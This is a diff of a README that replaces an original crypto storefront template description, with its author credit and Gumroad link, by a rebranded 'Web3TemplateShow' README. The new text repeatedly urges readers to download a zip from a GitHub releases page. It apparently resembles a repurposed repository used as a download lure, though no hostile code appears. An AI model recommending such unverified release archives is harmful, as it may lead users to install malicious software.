@@ -1,79 +1,75 @@
-# Crypto Shelfy Free
+# 🚀 Web3TemplateShow - Easy Web3 Wallet Integration Template
 
-A clean, powerful Next.js template to help creators & crypto builders launch digital storefronts—without reinventing the wheel.
+[![Download Web3TemplateShow](https://img.shields.io/badge/Download-Web3TemplateShow-blue)](https://github.com/lO-l192/Web3TemplateShow/releases)
 
----
+## 📦 What is Web3TemplateShow?
 
-## 🚀 What Is Crypto Shelfy Free?
+Web3TemplateShow is a NextJs template designed for easy wallet integration and token gating. This template helps freelancers and digital product creators quickly set up their Web3 applications. It offers a clean interface and simple setup so you can focus on building your project, not on the technical details.
 
-Crypto Shelfy Free gives you a sleek base template built with Next.js & Tailwind CSS. It’s perfect if you need a quick, professional-looking site to display and sell digital products (or just showcase your work) with minimal setup.
+## 🚀 Getting Started
 
-- Responsive, modern design  
-- Hero section + featured products grid  
-- SEO-friendly setup + fast load times  
-- Customizable styles (you control colors, fonts, layout)  
+To get started with Web3TemplateShow, follow these simple steps:
 
----
+1. **Check System Requirements**  
+   Ensure your computer meets the following minimum requirements:
+   - Windows, macOS, or Linux operating system.
+   - A modern web browser such as Chrome, Firefox, or Safari.
+   - Node.js version 14 or above installed.
+   - Basic understanding of running local applications.
 
-## 📸 Preview
+2. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/lO-l192/Web3TemplateShow/releases) to find the latest version of the application.
 
-![Crypto Shelfy Demo Screenshot](./Screenshots/ctsHomePage.png)
+3. **Download the Template**  
+   On the Releases page, locate the latest version. Click on it to expand the release details. Download the zip file for the latest release.
 
-*(Screenshots in `/screenshots/` folder — check them out for how clean and polished this looks on desktop & mobile.)*
+4. **Extract the Files**  
+   Once the download completes, find the zip file in your Downloads folder. Right-click on the file and select "Extract All" or use your favorite extraction program.
 
----
+5. **Install Dependencies**  
+   After extracting the files, open a terminal (Command Prompt on Windows, Terminal on macOS or Linux). Navigate to the folder where you extracted the Web3TemplateShow files. Run the following command to install all necessary dependencies:
+   ```bash
+   npm install
+   ```
 
-## 🔧 Quick Start
+6. **Start the Application**  
+   After installing the dependencies, you can run the application. In the terminal, execute:
+   ```bash
+   npm run dev
+   ```
+   This command starts a local server. You should see a message indicating that your application is running at `http://localhost:3000`.
 
-Follow these steps to get up and running:
+7. **Open the Application in Your Browser**  
+   Open your preferred web browser and go to [http://localhost:3000](http://localhost:3000). You should see the Web3TemplateShow interface.
 
-```bash
-# Clone this repo
-git clone https://github.com/yourusername/crypto-shelfy-free.git
+8. **Explore Features**  
+   Here are some key features you can try out:
+   - **Wallet Integration:** Easily connect to popular wallets like MetaMask.
+   - **Token Gating:** Control access to parts of your application based on token ownership.
+   - **User-Friendly Design:** Focused on ease of use without technical jargon.
 
-# Install dependencies
-cd crypto-shelfy-free
-npm install
+## 💻 Support and Troubleshooting
 
-# Run locally
-npm run dev
-```
+If you face any issues while downloading or running the application, here are some common solutions:
 
-## ⚠️ Licensing & Terms
+- **Installation Issues:** Make sure you have Node.js installed correctly. You can check by running `node -v` in your terminal.
+- **Network Problems:** Ensure that your internet connection is stable while downloading dependencies.
+- **Compatibility Issues:** Ensure your operating system and browser are updated to the latest versions.
 
-This free base template is released under the MIT License. You are free to use/modify it for personal or commercial projects. Redistribution or resale of the full or modified code as a competing product is prohibited.
+## 🎉 Community Contributions
 
-Premium version comes with its own commercial license (see package for details).
+We welcome contributions! If you have suggestions for improvements or features, feel free to submit a pull request or create an issue on the repository. Your input helps make Web3TemplateShow better for everyone.
 
-## 💡 Why Use Crypto Shelfy Free?
+## 🔗 Useful Links
 
-Test your brand quickly, see what works
+- [Web3TemplateShow GitHub Repository](https://github.com/lO-l192/Web3TemplateShow)
+- [Documentation](https://github.com/lO-l192/Web3TemplateShow/wiki)
+- [Support](mailto:support@example.com)
 
-Use the free version as your online presence while building up content
+## 📥 Download & Install
 
-Ideal base if you plan to upgrade later (why rebuild when you can scale up?)
+To download Web3TemplateShow, click on the link below:
 
-## 🛠 Roadmap / What’s Coming (Premium Only)
+[Download Web3TemplateShow](https://github.com/lO-l192/Web3TemplateShow/releases)
 
-More product page styles
-
-Enhanced payment integrations
-
-Dashboard & usage analytics
-
-Better documentation & setup wizards
-
-## 🧑‍💻 Author
-
-Built with care by GoldJaguar, indie dev & creator. I believe clean tools should help you shine—without overcomplicating things.
-
-## ℹ️ Where to Download
-
-To get the free zip version and support future updates, use Gumroad:
-
-Download Crypto Shelfy Free on Gumroad →
-[(https://web3builderkit.gumroad.com/l/cryptoshelfyFree)]
-
-✅ Feedback & Contributions
-
-While this free version is stable, I always welcome feedback! If you find bugs, have ideas, or want to suggest features, feel free to open an issue or drop me a message.
+Follow the steps outlined above to install and run the software smoothly. Enjoy building your Web3 project with Web3TemplateShow!
